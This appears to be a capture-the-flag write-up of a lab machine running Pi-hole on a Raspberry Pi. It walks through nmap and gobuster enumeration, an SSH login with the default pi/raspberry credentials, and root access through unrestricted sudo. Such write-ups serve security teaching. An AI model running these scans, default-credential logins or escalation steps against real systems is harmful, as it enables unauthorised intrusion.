# nmap

enumerating the target using namp,
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.189.62
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 10:59 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:59
Completed NSE at 10:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:59
Completed NSE at 10:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:59
Completed NSE at 10:59, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:59
Completed Parallel DNS resolution of 1 host. at 10:59, 0.04s elapsed
Initiating SYN Stealth Scan at 10:59
Scanning 10.129.189.62 [20000 ports]
Discovered open port 53/tcp on 10.129.189.62
Discovered open port 22/tcp on 10.129.189.62
Discovered open port 80/tcp on 10.129.189.62
Discovered open port 1940/tcp on 10.129.189.62
SYN Stealth Scan Timing: About 54.91% done; ETC: 11:00 (0:00:30 remaining)
SYN Stealth Scan Timing: About 61.61% done; ETC: 11:01 (0:00:44 remaining)
SYN Stealth Scan Timing: About 70.75% done; ETC: 11:02 (0:00:48 remaining)
Increasing send delay for 10.129.189.62 from 0 to 5 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 11:02, 176.57s elapsed (20000 total ports)
Initiating Service scan at 11:02
Scanning 4 services on 10.129.189.62
Completed Service scan at 11:02, 12.25s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.129.189.62
Retrying OS detection (try #2) against 10.129.189.62
Retrying OS detection (try #3) against 10.129.189.62
Retrying OS detection (try #4) against 10.129.189.62
Retrying OS detection (try #5) against 10.129.189.62
Initiating Traceroute at 11:03
Completed Traceroute at 11:03, 0.29s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:03
Completed Parallel DNS resolution of 2 hosts. at 11:03, 0.00s elapsed
NSE: Script scanning 10.129.189.62.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 10.96s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 1.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
Nmap scan report for 10.129.189.62
Host is up, received user-set (0.31s latency).
Scanned at 2021-08-16 10:59:49 IST for 224s
Not shown: 19996 closed ports
Reason: 19996 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp   open  domain  syn-ack ttl 63 dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp   open  http    syn-ack ttl 63 lighttpd 1.4.35
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1940/tcp open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/16%OT=22%CT=1%CU=39865%PV=Y%DS=2%DC=T%G=Y%TM=6119F8A
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54BST11NW6%O2=M54BST11NW6%O3=M54BNNT11NW6%O4=M54BST11NW6%O5=M54BST1
OS:1NW6%O6=M54BST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 0.000 days (since Mon Aug 16 11:03:05 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   289.39 ms 10.10.16.1
2   289.48 ms 10.129.189.62

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.93 seconds
           Raw packets sent: 21188 (936.322KB) | Rcvd: 27921 (2.312MB)
```
we got a lot of services running on the machine

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.189.62 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.189.62
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/16 11:00:14 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.189.62/admin                [Size: 0] [--> http://10.129.189.62/admin/]
http://10.129.189.62/swfobject.js         [Size: 61]                                 
                                                                                     
===============================================================
2021/08/16 11:02:22 Finished
===============================================================
```
the admin page gives us a hint and we have a login page too.I searched for the default credentials for pi-hole login and found they are
user:pi
pass:raspberry

I tried logging into machine through ssh using the creds and I am into the machine as user pi.
```
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 16 06:02:02 2021 from 10.10.16.4

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
pi@raspberrypi:~ $ whoami
pi
pi@raspberrypi:~ $ 
```
I ran sudo -l and here is the response.

```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
we can run every service as root it seems.

>sudo -u root /bin/bash

and we are root.

```
pi@raspberrypi:~ $ sudo -u root /bin/bash
root@raspberrypi:/home/pi# id
uid=0(root) gid=0(root) groups=0(root)
```
